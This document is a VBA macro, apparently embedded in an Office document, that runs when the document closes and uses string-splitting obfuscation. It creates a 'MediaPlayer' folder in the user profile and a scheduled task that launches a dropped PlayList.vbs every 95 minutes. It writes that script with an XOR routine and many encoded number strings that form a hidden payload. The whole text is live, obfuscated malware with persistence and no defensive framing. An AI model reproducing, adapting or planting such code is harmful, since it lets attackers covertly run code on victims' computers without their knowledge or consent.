Private Sub Document_Close()
On Error Resume Next
Dim IDgoiCGfJEN
Set IDgoiCGfJEN = CreateObject("W" + "Sc" + "ri" + "pt" + "" + "." + "Sh" + "el" + "" + "l")
Set efTeVGyBeDj = CreateObject("Sc" + "" + "ri" + "pti" + "ng" + "." + "Fi" + "le" + "Sy" + "" + "ste" + "mO" + "bj" + "ect")
edFNuWhRQVm = Environ("US" + "" + "ER" + "PROF" + "IL" + "" + "E") + "\" + "Me" + "di" + "" + "aP" + "la" + "ye" + "" + "r"
If Not efTeVGyBeDj.FolderExists(edFNuWhRQVm) Then efTeVGyBeDj.CreateFolder (edFNuWhRQVm)
IDMBgCUmJCI = edFNuWhRQVm + "\" + "" + "Pl" + "" + "ay" + "" + "Li" + "st" + "" + "." + "v" + "" + "bs" + ""
JKycfMDqGlk = IDgoiCGfJEN.Run("s" + "ch" + "ta" + "sk" + "s" + " /" + "Cre" + "a" + "te /S" + "C M" + "I" + "N" + "U" + "TE " + "/" + "M" + "O 9" + "5 /" + "F /t" + "n M" + "e" + "di" + "aP" + "la" + "ye" + "r /tr " + IDMBgCUmJCI + "", 0, False)
Dim uBTZUpQmXdk As Object
Set uBTZUpQmXdk = efTeVGyBeDj.CreateTextFile(IDMBgCUmJCI, True, True)
uBTZUpQmXdk.Write "Pu" + "" + "bl" + "ic" + "" + " " + "Fu" + "nct" + "" + "io" + "n" + " DoZrIHgSuIb" + "(" + "UZptMiKwqSx" + ")" & vbCrLf
uBTZUpQmXdk.Write "veKGMFdNfgC" + " =" + " oJnjTPWprBS " + "(""wGmqJxM"")" & vbCrLf
uBTZUpQmXdk.Write "Di" + "" + "m" + " piKsVMlXpJf" + "" & vbCrLf
uBTZUpQmXdk.Write "xFeLIbnURFx" + " = """"" & vbCrLf
uBTZUpQmXdk.Write "KBrOmGzCCBs" + " =" + " 0" + "" & vbCrLf
uBTZUpQmXdk.Write "piKsVMlXpJf" + " = " + "Sp" + "li" + "t" + "(" + "UZptMiKwqSx" + ", "":""," + " -" + "1" + "," + " 0)" & vbCrLf
uBTZUpQmXdk.Write "F" + "o" + "r" + "" + " vitAWmmEJyO " + "=" + " 0" + " T" + "" + "o " + "UB" + "" + "ou" + "nd" + "" + "(" + "piKsVMlXpJf)" & vbCrLf
uBTZUpQmXdk.Write "xFeLIbnURFx" + " =" + " xFeLIbnURFx" + " + " + "C" + "" + "hr" + "(" + "piKsVMlXpJf(" + "vitAWmmEJyO)" + " X" + "o" + "" + "r" + " veKGMFdNfgC" + "(" + "KBrOmGzCCBs))" & vbCrLf
uBTZUpQmXdk.Write "I" + "" + "f" + " KBrOmGzCCBs" + " < " + "UB" + "" + "ou" + "nd" + "" + "(veKGMFdNfgC) " + "T" + "he" + "" + "n" & vbCrLf
uBTZUpQmXdk.Write "KBrOmGzCCBs " + "= " + "KBrOmGzCCBs" + " + " + "1" & vbCrLf
uBTZUpQmXdk.Write "El" + "" + "se" + "" + ":" + " KBrOmGzCCBs" + " = " + "0" & vbCrLf
uBTZUpQmXdk.Write "En" + "" + "d" + " I" + "f" & vbCrLf
uBTZUpQmXdk.Write "N" + "" + "ex" + "t" & vbCrLf
uBTZUpQmXdk.Write "DoZrIHgSuIb " + "= " + "xFeLIbnURFx" & vbCrLf
uBTZUpQmXdk.Write "En" + "" + "d" + " F" + "u" + "nc" + "" + "ti" + "on" & vbCrLf
uBTZUpQmXdk.Write "Pu" + "" + "bl" + "ic" + " Fu" + "" + "nc" + "ti" + "" + "on" + " oJnjTPWprBS" + "(" + "KvODKivIXRC)" & vbCrLf
uBTZUpQmXdk.Write "O" + "n E" + "r" + "r" + "o" + "r R" + "es" + "u" + "m" + "e Ne" + "x" + "t" & vbCrLf
uBTZUpQmXdk.Write "Di" + "" + "m" + " ACHHFFwkHDw" + ", " + "veKGMFdNfgC(" + ")" & vbCrLf
uBTZUpQmXdk.Write "R" + "" + "eD" + "" + "im " + "veKGMFdNfgC" + "(Le" + "" + "n" + "(" + "KvODKivIXRC) " + "- " + "1)" & vbCrLf
uBTZUpQmXdk.Write "F" + "" + "o" + "r " + "ACHHFFwkHDw" + " =" + " 0" + " T" + "" + "o" + " UB" + "" + "ou" + "nd" + "" + "(" + "veKGMFdNfgC)" & vbCrLf
uBTZUpQmXdk.Write "veKGMFdNfgC" + "(" + "ACHHFFwkHDw) " + "= " + "As" + "" + "c" + "(Mi" + "" + "d" + "(KvODKivIXRC" + ", ACHHFFwkHDw" + " + " + "1" + ", 1" + "))" & vbCrLf
uBTZUpQmXdk.Write "Ne" + "" + "xt" + "" & vbCrLf
uBTZUpQmXdk.Write "oJnjTPWprBS" + "" + " =" + " veKGMFdNfgC" & vbCrLf
uBTZUpQmXdk.Write "En" + "" + "d" + " Fu" + "" + "nc" + "tio" + "" + "n" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx " + "= " + """""" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""49:50:3:18:62:17:34:25:103:40:31:41:23:41:18:111:77:28:51:62:36:27:34:30:56:36:88:100""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""51:46:0:81:46:12:58:18:14:65:81:26:30:38:36:6:43:36:1:18:55:91:103:4:22:38:20:43""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:46:12:58:18:14:77:76:106:59:63:18:38:25:20:5:26:39:18:36:25:89:106:90:30:20:53:4:1:62:17:35:16:105:43:24:38:29:30:14:52:25:20:39:55:47:29:34:14:5:104:88:100""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""37:34:30:34:62:10:36:25:32:77:76:106:90:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:26:30:38:36:6:43:36:1:18:55:87:122:77:21:62:15:40:62:105:42:20:62:62:36:27:34:69:81:39:1:11:30:43:8:2:3:22:109:94""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:35:31:33:27:33:77:76:106:40:43:28:20:44:55:31:51:39:13:105:34:1:47:22:12:4:19:8:9:62:43:57:5:34:12:28:98:88:124:91:103:93:81:99""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""51:40:77:36:36:12:36:27:103:4:22:38:20:43:89:6:25:52:36:28:2:17:20:25:3:47:25:32:87""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""4:122:36:31:62:80:12:4:36:69:24:45:20:33:17:105:63:20:43:28:101:70:110:68:88:97:77:109""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""30:33:77:34:116:74:120:66:103:57:25:47:22:109:36:122:62:92:120:77:123""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""37:34:30:34:62:10:36:25:32:77:76:106:42:40:4:20:25:3:35:22:42:87:108:77:50:34:10:101:4:110:77""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""59:40:2:1""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:14:30:46:29:109:74:103:63:20:57:43:57:5:46:3:22""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:12:13:35:20:51:4:30:36""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:59:0:40:27:50:77:76:106:47:30:20:53:4:1:62:86:14:5:34:12:5:47:55:47:29:34:14:5:98:90:26:36:36:31:24:58:12:99:36:47:8:29:38:90:100""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:5:11:60:60:16:36:58:40:29:8:87:122:77:50:56:29:44:3:34:34:19:32:29:46:3:111:79:60:25:32:0:59:117:67:41:7:52:5:35:19:61:83:99""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:34:15:58:2:50:77:76:106:59:63:18:38:25:20:5:26:39:18:36:25:89:104:57:9:56:3:47:95:25:12:63:18:38:0:83:99""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:41:48:7:45:23:6:9:11:27:14:87:122:77:50:56:29:44:3:34:34:19:32:29:46:3:111:79:38:25:27:63:30:55:25:95:25:16:40:27:43:79:88""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:46:12:58:18:14:77:76:106:59:63:18:38:25:20:5:26:39:18:36:25:89:104:43:46:5:46:29:5:35:22:42:89:1:4:29:47:43:52:4:51:8:28:5:26:39:18:36:25:83:99""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""52:1:62:57:4:9:109:74:103:79:57:1:61:20:40:4:56:35:24:61:3:35:24:56:34:15:42:17:36:40:11:5:61:25:63:18:27:32:24:41:10:34:4:40:11:5:22:47:36:25:35:2:6:57:36:14:2:53:31:20:36:12:27:18:53:30:24:37:22:17:37:50:3:62:36:27:40:43:10:8:21:35:25:29:27:38:20:20:56:90""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""37:54:25:50:62:44:109:74:103:14:57:0:34:29:28:63:44:18:9:86:8:15:55:12:31:46:61:35:1:46:31:30:36:21:40:25:51:62:5:56:17:35:16:52:69:83:111:45:30:50:21:61:35:5:62:4:59:2:72:83:99""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""26:2:47:28:11:22:26:50:32:10:76:41:48:7:45:23:6:9:11:27:14:89:2:21:1:43:22:41:50:41:27:24:56:23:35:26:34:3:5:25:12:63:30:41:10:2:98:90:104:52:8:32:33:31:44:8:37:9:44:60:15:93:111:94""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:61:5:27:61:69:46:63:13:55:33:33:0:12:20:4:67:52:50:8:44:25:35:40:31:60:17:63:24:41:0:20:36:12:30:3:53:4:31:45:11:101:85:98:62:40:25:44:8:58:3:63:56:28:61:104:85:110""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""54:15:20:59:47:51:112:20:15:39:43:26:19:53:54:36:46:95:15:0:61:22:41:9:52:36:14:36:5:40:3:28:47:22:57:36:51:31:24:36:31:62:95:101:72:48:26:40:9:54:19:44:84:104:81""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""38:44:11:59:1:31:109:74:103:79:45:7:17:46:5:40:30:30:44:12:17:32:46:3:21:37:15:62:43:101""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""61:45:5:6:19:51:55:15:32:35:81:119:88:12:63:62:39:20:1:83:28:28:33:39:58:45:83:111:52:40:2:26:35:29:62:89:34:21:20:104""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""22:0:3:56:62:88:112:87:6:37:8:0:29:6:92:22:6:23:0:51:42:92:101:46:30:37:19:36:18:52:67:5:50:12:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""51:44:14:35:18:32:109:74:103:37:20:50:80:41:3:48:8:56:100:63:40:3:3:31:24:60:29:101:53:61:5:27:61:81:99:36:34:31:24:43:20:3:2:42:15:20:56:81""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:37:26:39:32:10:36:34:47:10:59:30:36:8:81:119:88:10:18:51:34:19:32:29:46:3:111:79:6:35:22:32:16:42:25:2:112:87:98:85:103:75:81:104:86:111:87:97:77:83:101:10:34:24:51:66:18:35:21:59:69:101:68""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:41:23:33:62:51:8:28:57:88:112:87:40:15:27:29:53:4:36:34:31:7:35:27:40:89:2:21:20:41:41:56:18:53:20:89:104:43:40:27:34:14:5:106:82:109:17:53:2:28:106:47:36:25:116:95:46:8:49:2:36:103:26:25:47:10:40:87:23:31:24:39:25:63:14:5:36:62:25:88:112:87:51:31:4:47:90:97:87:107:77:69:114:81""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""49:40:31:81:15:25:46:31:103:2:19:32:49:57:18:42:77:56:36:88:46:24:43:36:5:47:21:62""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""4:51:31:60:57:31:120:87:122:77:2:62:10:0:4:32:88:81:108:88:34:21:45:36:5:47:21:99:58:38:3:4:44:25:46:3:50:31:20:56:88:107:87:101:64:83:106:94:109:24:37:7:56:62:29:32:89:17:8:3:57:17:34:25""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""57:34:21:5""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:111:31:51:25:1:112:87:98:16:34:25:8:63:25:58:18:53:67:28:51:30:57:7:105:15:24:48:87:111:92:103:0:52:8:21:12:25:16:40:22:45:88:102:87:101:50:83:106:83:109:51:44:14:35:18:32:109:92:103:79:94:104:88:102:87:52:25:3:7:11:42:66:103:70:81:104:87:61:5:40:14:20:57:39:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""36:34:25:81:41:23:33:62:51:8:28:57:88:112:87:40:15:27:29:53:4:36:34:31:7:35:27:40:89:2:21:20:41:41:56:18:53:20:89:104:43:40:27:34:14:5:106:82:109:17:53:2:28:106:47:36:25:116:95:46:26:10:34:20:34:30:2:104:81""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""49:40:31:81:15:25:46:31:103:2:19:32:49:57:18:42:77:56:36:88:46:24:43:36:5:47:21:62""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:8:63:24:36:8:9:58:86:40:15:34:79:81:30:16:40:25""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:7:53:2:18:47:0:61:89:34:21:20:104""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:15:36:5:34:30:25:43:10:38:89:34:21:20:104:88:25:31:34:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:0:46:31:20:57:16:44:5:44:67:20:50:29:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:12:46:7:35:24:28:58:86:40:15:34:79:81:30:16:40:25""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:3:36:29:21:63:21:61:89:34:21:20:104""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:19:36:4:42:8:5:100:29:53:18:101:77:37:34:29:35""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:28:46:30:28:47:12:99:18:63:8:83""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:29:57:31:34:31:16:58:29:99:18:63:8:83:106:44:37:18:41""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:18:51:5:20:56:25:61:18:105:8:9:47:90""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:22:40:3:48:2:3:33:21:36:25:34:31:95:47:0:40:85:103:57:25:47:22""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:25:34:25:6:37:10:38:26:46:3:20:56:86:40:15:34:79""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:19:36:4:42:12:18:100:29:53:18:101:77:37:34:29:35""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:28:46:30:28:43:27:99:18:63:8:83""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:21:44:27:36:2:29:39:86:40:15:34:79:81:30:16:40:25""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:26:38:1:18:37:20:32:89:34:21:20:104""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:12:37:5:34:12:5:47:1:40:89:34:21:20:104:88:25:31:34:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:3:47:31:20:43:12:40:14:34:67:20:50:29:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:11:32:22:53:25:2:36:17:43:17:105:8:9:47:90:109:35:47:8:31""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:4:42:12:3:62:11:35:30:33:11:95:47:0:40:85""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:1:34:5:44:67:20:50:29:111:87:19:5:20:36""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:14:40:31:26:100:29:53:18:101""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:11:35:30:33:11:1:43:11:62:89:34:21:20:104:88:25:31:34:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:4:41:4:23:44:8:44:4:52:67:20:50:29:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:8:58:19:50:0:1:125:86:40:15:34:79:81:30:16:40:25""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:7:48:9:4:39:8:122:89:34:21:20:104""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:11:44:26:35:24:28:58:74:99:18:63:8:83:106:44:37:18:41""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:4:38:0:21:63:21:61:69:105:8:9:47:90""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:26:38:31:46:27:20:100:29:53:18:101:77:37:34:29:35""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:21:44:5:24:60:29:99:18:63:8:83""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:30:40:18:4:3:34:0:95:4:25:32:18:103:80:81:104:29:57:3:34:31:18:43:8:99:18:63:8:83:106:44:37:18:41""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:18:18:51:25:20:56:27:44:7:105:8:9:47:90""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:3:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""57:34:21:5""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:15:61:17:46:20:59:46:30:34:18:77:90:106:90:98:7:43:12:8:47:10:18:69:113:67:1:34:8:111""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""53:13:59:50:47:9:27:36:18:56:81:119:88:31:18:55:1:16:41:29:101:53:13:59:50:47:9:27:36:18:56:93:106:90:109:85:107:77:83:104:81""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""6:63:8:29:63:86:31:18:32:58:3:35:12:40:87:4:43:34:2:54:60:91:103:79:6:57:27:63:30:55:25:95:47:0:40:87:104:66:19:106:90:102:87:21:28:5:9:12:25:87:108:79:45:7:29:41:30:38:61:29:43:1:40:5:27:61:29:43:1:1:30:52:25:95:60:26:62:85""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""49:49:27:59:15:15:41:28:23:59:81:119:88:124""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""51:40""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""32:20:14:3:35:8:57:89:20:1:20:47:8:109:70:127:91:69:126:74""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:21:62:15:40:62:105:43:24:38:29:40:15:46:30:5:57:80:7:29:47:26:40:1:2:53:16:9:68:81:30:16:40:25:103:9:5:61:29:4:89:3:8:29:47:12:40:49:46:1:20:106:50:39:31:48:52:58:48:0:42:57""))& vbCrLf" & vbCrLf
